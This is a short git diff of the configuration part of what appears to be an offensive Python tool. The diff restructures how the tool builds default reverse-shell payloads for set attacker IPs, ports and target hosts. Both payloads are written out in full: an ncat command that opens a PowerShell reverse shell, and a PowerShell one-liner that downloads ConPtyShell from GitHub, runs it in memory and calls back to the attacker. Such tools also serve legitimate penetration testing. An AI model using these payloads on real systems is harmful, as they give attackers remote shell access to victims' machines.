@@ -15,15 +15,18 @@ reverse_shell_ips = ["10.1.1.21"]
 reverse_shell_ports = [1038]
 target_ips = ["10.1.1.10"]
 target_ports = [1002, 1032] # optional, if not sure just set to []
+payloads = [] #You can also put your payloads here if you don't want the default
 
-ncat_dir = "C:\\Temp\\nc64.exe"
-payloads = []
-for reverse_shell_ip in reverse_shell_ips:
-    for reverse_shell_port in reverse_shell_ports:
-        payload1 = f"{ncat_dir} {reverse_shell_ip} {reverse_shell_port} -e powershell"
-        payload2 = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {reverse_shell_ip} {reverse_shell_port}"
-        payloads.append(payload1)
-        payloads.append(payload2)
+if payloads == []:
+    # Default payloads are a local netcat (in case of a privesc scenario) or remote call to a revshell script
+    ncat_dir = "C:\\Temp\\nc64.exe" # This is on the target system, NOT ON THE REMOTEHOST.
+    for reverse_shell_ip in reverse_shell_ips:
+        for reverse_shell_port in reverse_shell_ports:
+            payload1 = f"{ncat_dir} {reverse_shell_ip} {reverse_shell_port} -e powershell"
+            payload2 = f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {reverse_shell_ip} {reverse_shell_port}"
+            payloads.append(payload1)
+            payloads.append(payload2)
+            
         
         
 
